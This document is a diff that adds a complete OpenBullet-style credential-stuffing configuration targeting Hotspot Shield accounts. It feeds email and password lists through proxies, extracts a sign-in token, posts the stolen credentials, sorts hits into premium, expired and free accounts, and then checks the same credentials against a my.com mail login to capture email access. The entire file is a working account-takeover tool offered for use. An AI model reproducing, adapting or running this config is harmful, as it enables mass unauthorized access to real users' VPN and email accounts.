@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "Hotspotshield",
+  "SuggestedBots": 20,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-07T09:06:30.1551641+04:30",
+  "AdditionalInfo": "Hit Only Premium",
+  "Author": "TakTir",
+  "Version": "1.2.6.5 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://account.hotspotshield.com/sign-in/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "vxsftok: '" "'" -> VAR "TOKEN" 
+
+REQUEST POST "https://account.hotspotshield.com/sign-in" 
+  CONTENT "login=<USER>&pwd=<PASS>&remember=0&ajax=true&vxsftok=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "authority: account.hotspotshield.com" 
+  HEADER "method: POST" 
+  HEADER "path: /sign-in" 
+  HEADER "scheme: https" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "origin: https://account.hotspotshield.com" 
+  HEADER "referer: https://account.hotspotshield.com/sign-in/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "result\":1" 
+  KEYCHAIN Failure OR 
+    KEY "result\":0" 
+
+REQUEST GET "https://account.hotspotshield.com/#account" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<span class=\"red\">Expired</span>" 
+    KEY "<h4>Free Membership</h4>" 
+
+REQUEST GET "https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=<USER>&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&Password=<PASS>&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "UserAgent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+  HEADER "ContentType: application/x-www-form-urlencoded" 
+
+PARSE "<SOURCE>" LR "[\"AjaxResponse\", \"OK\", \"" "\"]" -> VAR "ACCESS" 
+
+FUNCTION Replace "Ok=0" "False" "<ACCESS>" -> CAP "Email Access" 
+
+FUNCTION Replace "Ok=1" "True" "<ACCESS>" -> CAP "Email Access" 
